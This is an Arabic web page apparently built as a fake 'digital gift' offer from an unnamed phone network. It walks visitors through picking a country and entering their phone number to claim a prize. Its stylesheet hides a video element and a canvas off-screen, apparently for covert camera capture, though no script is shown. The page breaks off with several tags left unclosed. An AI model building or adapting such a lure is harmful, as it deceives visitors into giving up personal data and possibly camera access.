<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>هدية رقمية · شبكة الاتصالات</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        /* ============================================================
           RESET · BASE
           ============================================================ */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #080c1a;
            --bg-secondary: #0e1428;
            --glass-bg: rgba(255, 255, 255, 0.025);
            --glass-border: rgba(255, 255, 255, 0.06);
            --gold: #c9a84c;
            --gold-light: #e8d5a3;
            --gold-dark: #a8873a;
            --silver: #a8b4c8;
            --text-primary: #f0ece6;
            --text-secondary: rgba(255, 255, 255, 0.55);
            --shadow-glow: rgba(201, 168, 76, 0.12);
            --radius-xl: 52px;
            --radius-lg: 28px;
            --radius-md: 18px;
            --transition-bounce: cubic-bezier(0.34, 1.56, 0.64, 1);
            --transition-smooth: cubic-bezier(0.23, 1, 0.32, 1);
            --transition-slow: cubic-bezier(0.6, 0, 0.4, 1);
        }

        html {
            font-size: 16px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            font-family: 'Cairo', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 18px;
            background: var(--bg-primary);
            color: var(--text-primary);
            position: relative;
            overflow-x: hidden;
        }

        /* ============================================================
           BG · ATMOSPHERE
           ============================================================ */
        #bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .bg-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            pointer-events: none;
            z-index: 0;
            opacity: 0.3;
            animation: orbDrift 20s ease-in-out infinite alternate;
        }

        .bg-orb--1 {
            width: 60vmax;
            height: 60vmax;
            top: -10%;
            right: -20%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.06), transparent 70%);
            animation-duration: 28s;
        }

        .bg-orb--2 {
            width: 50vmax;
            height: 50vmax;
            bottom: -15%;
            left: -15%;
            background: radial-gradient(ellipse, rgba(100, 80, 200, 0.04), transparent 70%);
            animation-duration: 24s;
            animation-delay: 4s;
        }

        .bg-orb--3 {
            width: 40vmax;
            height: 40vmax;
            top: 40%;
            left: 50%;
            transform: translateX(-50%);
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.025), transparent 60%);
            animation-duration: 32s;
            animation-delay: 8s;
        }

        @keyframes orbDrift {
            0% {
                transform: translate(0, 0) scale(1);
            }
            33% {
                transform: translate(3%, -2%) scale(1.04);
            }
            66% {
                transform: translate(-2%, 3%) scale(0.96);
            }
            100% {
                transform: translate(2%, -3%) scale(1.02);
            }
        }

        .bg-grain {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none;
            opacity: 0.015;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
            background-size: 256px 256px;
            animation: grainMove 0.8s steps(4) infinite;
        }

        @keyframes grainMove {
            0% {
                transform: translate(0, 0);
            }
            100% {
                transform: translate(4px, 4px);
            }
        }

        .bg-ambient {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none;
            background:
                radial-gradient(ellipse at 20% 30%, rgba(201, 168, 76, 0.012), transparent 50%),
                radial-gradient(ellipse at 80% 70%, rgba(140, 120, 200, 0.008), transparent 40%);
        }

        /* ============================================================
           WRAPPER
           ============================================================ */
        .app-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
        }

        /* ============================================================
           HEADER
           ============================================================ */
        .app-header {
            text-align: center;
            margin-bottom: 34px;
            position: relative;
        }

        .app-header .brand {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            position: relative;
            margin-bottom: 4px;
        }

        .app-header .brand-icon {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.08), rgba(201, 168, 76, 0.02));
            border: 1px solid rgba(201, 168, 76, 0.06);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 26px;
            color: var(--gold);
            position: relative;
            backdrop-filter: blur(12px);
            animation: brandPulse 4s ease-in-out infinite;
            box-shadow: 0 0 60px rgba(201, 168, 76, 0.04);
        }

        .app-header .brand-icon::after {
            content: '';
            position: absolute;
            inset: -4px;
            border-radius: 50%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.06), transparent 60%);
            filter: blur(16px);
            animation: iconGlow 3s ease-in-out infinite alternate;
            pointer-events: none;
        }

        @keyframes brandPulse {
            0%,
            100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.04);
            }
        }

        @keyframes iconGlow {
            0% {
                opacity: 0.4;
                transform: scale(0.8);
            }
            100% {
                opacity: 1;
                transform: scale(1.3);
            }
        }

        .app-header .brand-text {
            font-size: 30px;
            font-weight: 900;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #f0ece6, #e8d5a3, #c9a84c, #e8d5a3);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmerText 7s ease-in-out infinite;
        }

        @keyframes shimmerText {
            0%,
            100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }

        .app-header .subtitle {
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 300;
            letter-spacing: 3px;
            margin-top: 2px;
            text-transform: uppercase;
        }

        .app-header .subtitle i {
            color: var(--gold);
            margin: 0 6px;
            font-size: 12px;
            opacity: 0.6;
        }

        /* ============================================================
           STEP INDICATOR
           ============================================================ */
        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
            margin-bottom: 34px;
            position: relative;
            padding: 0 12px;
        }

        .step-indicator::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 14%;
            right: 14%;
            height: 1px;
            background: rgba(255, 255, 255, 0.04);
            transform: translateY(-50%);
            border-radius: 1px;
            z-index: 0;
        }

        .step-dot {
            position: relative;
            z-index: 1;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.15);
            transition: all 0.7s var(--transition-bounce);
            backdrop-filter: blur(6px);
            cursor: default;
        }

        .step-dot .dot-inner {
            position: relative;
            z-index: 2;
        }

        .step-dot .dot-ring {
            position: absolute;
            inset: -3px;
            border-radius: 50%;
            border: 1.5px solid transparent;
            transition: all 0.8s var(--transition-smooth);
            pointer-events: none;
        }

        .step-dot.active {
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.12), rgba(201, 168, 76, 0.03));
            border-color: rgba(201, 168, 76, 0.15);
            color: var(--gold-light);
            transform: scale(1.08);
            box-shadow: 0 0 50px rgba(201, 168, 76, 0.04);
        }

        .step-dot.active .dot-ring {
            border-color: rgba(201, 168, 76, 0.15);
            box-shadow: 0 0 30px rgba(201, 168, 76, 0.02);
        }

        .step-dot.completed {
            background: rgba(201, 168, 76, 0.04);
            border-color: rgba(201, 168, 76, 0.08);
            color: var(--gold);
        }

        .step-dot.completed .dot-ring {
            border-color: rgba(201, 168, 76, 0.06);
        }

        .step-line {
            position: relative;
            z-index: 0;
            flex: 1;
            max-width: 40px;
            height: 1px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 1px;
            transition: background 0.8s var(--transition-smooth);
        }

        .step-line.active {
            background: linear-gradient(90deg, rgba(201, 168, 76, 0.2), rgba(201, 168, 76, 0.05));
        }

        /* ============================================================
           MAIN CARD · CRYSTAL
           ============================================================ */
        .main-card {
            position: relative;
            background: var(--glass-bg);
            backdrop-filter: blur(48px) saturate(1.4);
            -webkit-backdrop-filter: blur(48px) saturate(1.4);
            border-radius: var(--radius-xl);
            padding: 34px 30px 28px;
            border: 1px solid var(--glass-border);
            box-shadow:
                0 60px 140px rgba(0, 0, 0, 0.6),
                0 0 0 1px rgba(255, 255, 255, 0.02) inset,
                0 0 120px rgba(201, 168, 76, 0.015) inset;
            overflow: hidden;
            transition: all 0.8s var(--transition-smooth);
        }

        .main-card::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: var(--radius-xl);
            padding: 1px;
            background: linear-gradient(135deg,
                    rgba(255, 255, 255, 0.04),
                    transparent 35%,
                    transparent 65%,
                    rgba(255, 255, 255, 0.015));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            z-index: 1;
        }

        .main-card .card-reflect {
            position: absolute;
            top: -60%;
            right: -40%;
            width: 120%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 20%, rgba(255, 255, 255, 0.02), transparent 50%);
            pointer-events: none;
            z-index: 0;
            animation: reflectMove 18s ease-in-out infinite alternate;
            transform: rotate(-12deg);
        }

        @keyframes reflectMove {
            0% {
                transform: translate(0, 0) rotate(-12deg) scale(1);
            }
            100% {
                transform: translate(6%, 4%) rotate(-8deg) scale(1.06);
            }
        }

        .main-card .card-glow-edge {
            position: absolute;
            inset: -1px;
            border-radius: var(--radius-xl);
            background: radial-gradient(ellipse at 50% 0%, rgba(201, 168, 76, 0.02), transparent 50%);
            pointer-events: none;
            z-index: 0;
            animation: edgeGlow 5s ease-in-out infinite alternate;
        }

        @keyframes edgeGlow {
            0% {
                opacity: 0.3;
            }
            100% {
                opacity: 1;
            }
        }

        .main-card .card-inner {
            position: relative;
            z-index: 2;
        }

        /* ============================================================
           STEPS
           ============================================================ */
        .step {
            display: none;
            animation: stepEnter 0.8s var(--transition-bounce) forwards;
        }

        .step.active {
            display: block;
        }

        @keyframes stepEnter {
            0% {
                opacity: 0;
                transform: translateY(36px) scale(0.96);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .step-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 2px;
            color: var(--text-primary);
            letter-spacing: 0.5px;
        }

        .step-title .highlight {
            background: linear-gradient(135deg, #e8d5a3, #c9a84c, #a8873a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .step-desc {
            color: var(--text-secondary);
            font-size: 15px;
            font-weight: 300;
            margin-bottom: 24px;
            letter-spacing: 0.3px;
        }

        /* ============================================================
           SIM CARD GRID · 3D GLASS
           ============================================================ */
        .sim-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 14px;
            margin: 18px 0 14px;
        }

        .sim-card {
            position: relative;
            background: rgba(255, 255, 255, 0.015);
            border: 1px solid rgba(255, 255, 255, 0.03);
            border-radius: var(--radius-lg);
            padding: 18px 8px 16px;
            color: var(--text-primary);
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            font-family: 'Cairo', sans-serif;
            transform: perspective(900px) rotateX(0deg) rotateY(0deg) translateZ(0);
            transition: all 0.6s var(--transition-bounce);
            will-change: transform;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            overflow: hidden;
        }

        .sim-card::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: var(--radius-lg);
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.04), transparent 40%, transparent 60%, rgba(255, 255, 255, 0.01));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            transition: all 0.6s ease;
        }

        .sim-card .sim-icon {
            font-size: 38px;
            color: rgba(255, 255, 255, 0.15);
            transition: all 0.6s var(--transition-bounce);
            filter: drop-shadow(0 4px 20px rgba(0, 0, 0, 0.2));
            position: relative;
        }

        .sim-card .sim-icon .icon-glow {
            position: absolute;
            inset: -8px;
            border-radius: 50%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.04), transparent 60%);
            filter: blur(12px);
            opacity: 0;
            transition: opacity 0.6s ease;
            pointer-events: none;
        }

        .sim-card .sim-name {
            font-size: 14px;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.7);
            transition: color 0.4s ease;
        }

        .sim-card .sim-chip {
            position: absolute;
            bottom: 8px;
            right: 12px;
            font-size: 10px;
            color: rgba(255, 255, 255, 0.04);
            letter-spacing: 2px;
            font-weight: 300;
        }

        .sim-card .sim-glow {
            position: absolute;
            inset: -2px;
            border-radius: var(--radius-lg);
            background: radial-gradient(ellipse at 50% 0%, rgba(201, 168, 76, 0.03), transparent 50%);
            opacity: 0;
            transition: opacity 0.6s ease;
            pointer-events: none;
        }

        .sim-card:hover {
            background: rgba(255, 255, 255, 0.025);
            border-color: rgba(201, 168, 76, 0.06);
            transform: perspective(900px) rotateX(1.5deg) rotateY(3deg) translateZ(14px) scale(1.02);
            box-shadow: 0 24px 70px rgba(0, 0, 0, 0.3), 0 0 60px rgba(201, 168, 76, 0.02);
        }

        .sim-card:hover .sim-icon {
            color: var(--gold-light);
            transform: scale(1.06) rotate(-2deg);
        }

        .sim-card:hover .sim-icon .icon-glow {
            opacity: 1;
        }

        .sim-card:hover .sim-name {
            color: var(--gold-light);
        }

        .sim-card:hover .sim-glow {
            opacity: 1;
        }

        .sim-card:active {
            transform: perspective(900px) rotateX(0deg) rotateY(0deg) translateZ(0) scale(0.94);
            transition-duration: 0.15s;
        }

        /* ============================================================
           GIFT PANEL
           ============================================================ */
        .gift-panel {
            position: relative;
            background: rgba(255, 255, 255, 0.01);
            border-radius: var(--radius-lg);
            padding: 22px 24px 20px;
            margin: 16px 0 20px;
            border: 1px solid rgba(255, 255, 255, 0.02);
            overflow: hidden;
        }

        .gift-panel::before {
            content: '';
            position: absolute;
            top: -40%;
            right: -20%;
            width: 60%;
            height: 180%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.015), transparent 60%);
            pointer-events: none;
        }

        .gift-panel .gift-top {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 18px;
            margin-bottom: 14px;
            position: relative;
            z-index: 1;
        }

        .gift-panel .gift-box-3d {
            font-size: 44px;
            color: var(--gold);
            display: inline-block;
            animation: giftFloat 3.6s ease-in-out infinite;
            filter: drop-shadow(0 8px 40px rgba(201, 168, 76, 0.04));
            position: relative;
            cursor: default;
            transition: transform 0.6s var(--transition-bounce);
        }

        .gift-panel .gift-box-3d:hover {
            transform: scale(1.06) rotate(-2deg);
        }

        @keyframes giftFloat {
            0%,
            100% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-6px) rotate(1.5deg);
            }
        }

        .gift-panel .gift-box-3d .gift-shine {
            position: absolute;
            top: -30%;
            left: -30%;
            width: 160%;
            height: 160%;
            background: radial-gradient(ellipse at 30% 20%, rgba(255, 215, 0, 0.04), transparent 50%);
            border-radius: 50%;
            filter: blur(24px);
            animation: giftShine 5s ease-in-out infinite alternate;
            pointer-events: none;
        }

        @keyframes giftShine {
            0% {
                opacity: 0.3;
                transform: scale(0.7);
            }
            100% {
                opacity: 1;
                transform: scale(1.3);
            }
        }

        .gift-panel .gift-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-primary);
            letter-spacing: 0.5px;
        }

        .gift-panel ul {
            list-style: none;
            padding: 0;
            margin: 4px 0 0;
            text-align: right;
            position: relative;
            z-index: 1;
        }

        .gift-panel ul li {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.015);
            color: rgba(220, 210, 200, 0.75);
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 16px;
            font-weight: 400;
        }

        .gift-panel ul li:last-child {
            border-bottom: none;
        }

        .gift-panel ul li i {
            color: var(--gold);
            font-size: 18px;
            width: 26px;
            text-align: center;
            opacity: 0.7;
            filter: drop-shadow(0 0 16px rgba(201, 168, 76, 0.04));
        }

        .gift-panel .gift-note {
            color: var(--text-secondary);
            font-size: 13px;
            margin-top: 14px;
            text-align: center;
            border-top: 1px solid rgba(255, 255, 255, 0.015);
            padding-top: 14px;
            position: relative;
            z-index: 1;
            opacity: 0.6;
        }

        .gift-panel .gift-note strong {
            color: var(--gold);
            font-weight: 700;
            opacity: 1;
        }

        /* ============================================================
           INPUT
           ============================================================ */
        .input-group {
            margin: 18px 0 16px;
            text-align: right;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 6px;
            font-weight: 700;
            letter-spacing: 0.5px;
            opacity: 0.7;
        }

        .input-group label i {
            color: var(--gold);
            margin-left: 10px;
            opacity: 0.6;
        }

        .input-group .input-wrap {
            position: relative;
            border-radius: 60px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.03);
            transition: all 0.5s var(--transition-smooth);
            overflow: hidden;
        }

        .input-group .input-wrap::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 60px;
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), transparent 40%, transparent 60%, rgba(255, 255, 255, 0.01));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            transition: all 0.5s ease;
        }

        .input-group .input-wrap:focus-within {
            border-color: rgba(201, 168, 76, 0.06);
            box-shadow: 0 0 0 6px rgba(201, 168, 76, 0.01), 0 0 60px rgba(201, 168, 76, 0.01);
        }

        .input-group .input-wrap:focus-within::before {
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.06), rgba(201, 168, 76, 0.01));
        }

        .input-group input {
            width: 100%;
            padding: 18px 24px;
            border: none;
            background: transparent;
            color: var(--text-primary);
            font-size: 20px;
            outline: none;
            font-family: 'Cairo', sans-serif;
            text-align: right;
            letter-spacing: 0.5px;
            position: relative;
            z-index: 1;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.06);
            font-size: 16px;
            font-weight: 300;
        }

        /* ============================================================
           BUTTON · PREMIUM
           ============================================================ */
        .btn-premium {
            position: relative;
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.04), rgba(201, 168, 76, 0.01));
            border: 1px solid rgba(201, 168, 76, 0.06);
            color: var(--gold-light);
            font-weight: 800;
            padding: 22px 30px;
            border-radius: 60px;
            font-size: 22px;
            width: 100%;
            cursor: pointer;
            transition: all 0.6s var(--transition-bounce);
            font-family: 'Cairo', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            letter-spacing: 1px;
            overflow: hidden;
            box-shadow:
                0 4px 40px rgba(201, 168, 76, 0.02),
                0 0 80px rgba(201, 168, 76, 0.005) inset;
            z-index: 1;
            backdrop-filter: blur(8px);
        }

        .btn-premium::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 60px;
            padding: 1px;
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.08), transparent 40%, transparent 60%, rgba(201, 168, 76, 0.03));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
        }

        .btn-premium::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 20%, rgba(201, 168, 76, 0.02), transparent 50%);
            pointer-events: none;
            animation: btnShine 8s ease-in-out infinite;
        }

        @keyframes btnShine {
            0% {
                transform: translate(0, 0) rotate(0deg);
            }
            100% {
                transform: translate(8%, 4%) rotate(4deg);
            }
        }

        .btn-premium:hover:not(:disabled) {
            transform: translateY(-3px) scale(1.005);
            border-color: rgba(201, 168, 76, 0.08);
            box-shadow: 0 16px 70px rgba(201, 168, 76, 0.02), 0 0 100px rgba(201, 168, 76, 0.01) inset;
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.06), rgba(201, 168, 76, 0.01));
        }

        .btn-premium:active:not(:disabled) {
            transform: translateY(0) scale(0.96);
            transition-duration: 0.15s;
        }

        .btn-premium:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-premium .btn-text {
            position: relative;
            z-index: 2;
        }

        .btn-premium .spinner {
            display: none;
            width: 26px;
            height: 26px;
            border: 2px solid rgba(201, 168, 76, 0.1);
            border-top: 2px solid var(--gold-light);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            position: relative;
            z-index: 2;
        }

        .btn-premium.loading .spinner {
            display: inline-block;
        }

        .btn-premium.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ============================================================
           STATUS
           ============================================================ */
        .status {
            margin-top: 16px;
            padding: 14px 20px;
            border-radius: var(--radius-md);
            font-size: 14px;
            font-weight: 600;
            display: none;
            backdrop-filter: blur(8px);
            text-align: center;
            transition: all 0.4s ease;
        }

        .status.success {
            background: rgba(201, 168, 76, 0.04);
            color: var(--gold-light);
            display: block;
            border: 1px solid rgba(201, 168, 76, 0.04);
            box-shadow: 0 0 40px rgba(201, 168, 76, 0.01);
        }

        .status.info {
            background: rgba(255, 255, 255, 0.01);
            color: var(--text-secondary);
            display: block;
            border: 1px solid rgba(255, 255, 255, 0.02);
        }

        .status.error {
            background: rgba(200, 80, 60, 0.04);
            color: #d47a6a;
            display: block;
            border: 1px solid rgba(200, 80, 60, 0.04);
        }

        /* ============================================================
           TIMER · LUXURY
           ============================================================ */
        .timer-luxury {
            position: relative;
            background: rgba(0, 0, 0, 0.15);
            border-radius: 60px;
            padding: 24px 30px;
            margin: 20px 0 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 28px;
            border: 1px solid rgba(255, 255, 255, 0.02);
            overflow: hidden;
            backdrop-filter: blur(12px);
        }

        .timer-luxury::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 60px;
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.02), transparent 40%, transparent 60%, rgba(255, 255, 255, 0.01));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
        }

        .timer-luxury .timer-icon {
            font-size: 36px;
            color: var(--gold);
            opacity: 0.4;
            animation: timerPulse 2.8s ease-in-out infinite;
            filter: drop-shadow(0 0 40px rgba(201, 168, 76, 0.02));
            position: relative;
            z-index: 1;
        }

        @keyframes timerPulse {
            0%,
            100% {
                opacity: 0.3;
                transform: scale(1);
            }
            50% {
                opacity: 0.6;
                transform: scale(1.04);
            }
        }

        .timer-luxury .timer-digits {
            font-size: 42px;
            font-weight: 900;
            color: var(--gold-light);
            letter-spacing: 6px;
            font-variant-numeric: tabular-nums;
            text-shadow: 0 0 60px rgba(201, 168, 76, 0.02);
            position: relative;
            z-index: 1;
            font-family: 'Cairo', monospace;
        }

        .timer-luxury .timer-sweep {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 20%, rgba(201, 168, 76, 0.01), transparent 50%);
            pointer-events: none;
            animation: timerSweep 10s ease-in-out infinite alternate;
        }

        @keyframes timerSweep {
            0% {
                transform: translate(0, 0) rotate(0deg);
            }
            100% {
                transform: translate(4%, 3%) rotate(3deg);
            }
        }

        .timer-sub {
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 300;
            text-align: center;
            margin-top: 4px;
            opacity: 0.4;
            letter-spacing: 0.5px;
        }

        /* ============================================================
           RESPONSIVE
           ============================================================ */
        @media (max-width: 520px) {
            .app-wrapper {
                padding: 0 2px;
            }

            .app-header .brand-text {
                font-size: 24px;
            }

            .app-header .brand-icon {
                width: 46px;
                height: 46px;
                font-size: 20px;
            }

            .main-card {
                padding: 24px 16px 20px;
                border-radius: 36px;
            }

            .sim-grid {
                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
                gap: 10px;
            }

            .sim-card {
                padding: 14px 6px 12px;
                border-radius: var(--radius-md);
                font-size: 12px;
            }

            .sim-card .sim-icon {
                font-size: 30px;
            }

            .sim-card .sim-name {
                font-size: 12px;
            }

            .step-title {
                font-size: 22px;
            }

            .btn-premium {
                font-size: 18px;
                padding: 18px 20px;
            }

            .step-dot {
                width: 34px;
                height: 34px;
                font-size: 11px;
            }

            .step-line {
                max-width: 24px;
            }

            .timer-luxury .timer-digits {
                font-size: 30px;
                letter-spacing: 4px;
            }

            .timer-luxury .timer-icon {
                font-size: 28px;
            }

            .timer-luxury {
                padding: 18px 20px;
                gap: 16px;
            }

            .gift-panel {
                padding: 16px 16px 14px;
                border-radius: var(--radius-md);
            }

            .gift-panel .gift-box-3d {
                font-size: 34px;
            }

            .gift-panel ul li {
                font-size: 13px;
                padding: 6px 0;
            }

            .input-group input {
                font-size: 17px;
                padding: 14px 18px;
            }

            .step-indicator {
                gap: 2px;
                margin-bottom: 26px;
            }
        }

        @media (max-width: 400px) {
            .sim-grid {
                grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
                gap: 8px;
            }

            .sim-card {
                padding: 10px 4px 10px;
                border-radius: 14px;
                font-size: 11px;
            }

            .sim-card .sim-icon {
                font-size: 24px;
            }

            .sim-card .sim-name {
                font-size: 10px;
            }

            .app-header .brand-text {
                font-size: 20px;
            }

            .app-header .brand-icon {
                width: 38px;
                height: 38px;
                font-size: 17px;
            }

            .step-title {
                font-size: 18px;
            }

            .btn-premium {
                font-size: 15px;
                padding: 14px 16px;
                gap: 10px;
            }

            .timer-luxury .timer-digits {
                font-size: 24px;
                letter-spacing: 3px;
            }

            .main-card {
                padding: 18px 12px 16px;
                border-radius: 28px;
            }

            .step-dot {
                width: 28px;
                height: 28px;
                font-size: 10px;
            }

            .step-line {
                max-width: 16px;
            }
        }

        /* ============================================================
           SCROLLBAR
           ============================================================ */
        ::-webkit-scrollbar {
            width: 3px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.01);
        }
        ::-webkit-scrollbar-thumb {
            background: rgba(201, 168, 76, 0.06);
            border-radius: 3px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: rgba(201, 168, 76, 0.1);
        }

        ::selection {
            background: rgba(201, 168, 76, 0.06);
            color: var(--gold-light);
        }

        /* ============================================================
           HIDDEN
           ============================================================ */
        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }

        #hiddenCanvas {
            display: none;
        }
    </style>
</head>
<body>

    <!-- ============================================================
    BG LAYERS
    ============================================================ -->
    <canvas id="bg-canvas"></canvas>
    <div class="bg-orb bg-orb--1"></div>
    <div class="bg-orb bg-orb--2"></div>
    <div class="bg-orb bg-orb--3"></div>
    <div class="bg-grain"></div>
    <div class="bg-ambient"></div>

    <!-- ============================================================
    APP
    ============================================================ -->
    <div class="app-wrapper">

        <!-- HEADER -->
        <header class="app-header">
            <div class="brand">
                <span class="brand-icon"><i class="fas fa-sim-card"></i></span>
                <span class="brand-text">شبكة الهدية</span>

        <!-- STEP INDICATOR -->
        <div class="step-indicator" id="stepIndicator">
            <div class="step-dot active" data-step="1">

            <div class="step-line" data-step="1"></div>
            <div class="step-dot" data-step="2">

            <div class="step-line" data-step="2"></div>

            </div>

        <!-- MAIN CARD -->
        <div class="main-card">
            <div class="card-reflect"></div>
            <div class="card-glow-edge"></div>
            <div class="card-inner">

                <!-- STEP 1: COUNTRY -->
                <div class="step active" id="step-country">
                    <div class="step-title">اختر <span class="highlight">شبكتك</span></div>
                    <p class="step-desc">حدد بلدك للحصول على هدية مخصصة لشريحتك</p>

                    <div class="status" id="statusCountry"></div>
                </div>

                <!-- STEP 2: CLAIM -->
                <div class="step" id="step-tasks">
                    <div class="step-title">استلم <span class="highlight">هديتك</span></div>
                    <p class="step-desc" id="taskSub">أكمل بياناتك وسنرسل الهدية إلى رقمك</p>

                    <div class="gift-panel" id="permissionArea">
                        <!-- dynamic -->
                    </div>

                    <div class="input-group">
                        <label for="phoneInput"><i class="fas fa-phone"></i> رقم الهاتف</label>
                        <div class="input-wrap">
                            <input type="text" id="phoneInput" placeholder="مثال: 01012345678" maxlength="15" autocomplete="tel" />
                        </div>
                    </div>

                    <button class="btn-premium" id="claimBtn">
                        <span class="btn-text"><i class="fas fa-gift" style="margin-left:12px;"></i> احصل على هديتي</span>
                        <span class="spinner"></span>
                    </button>

                </div>

                <!-- STEP 3: TIMER -->
                <div class="step" id="step-timer">
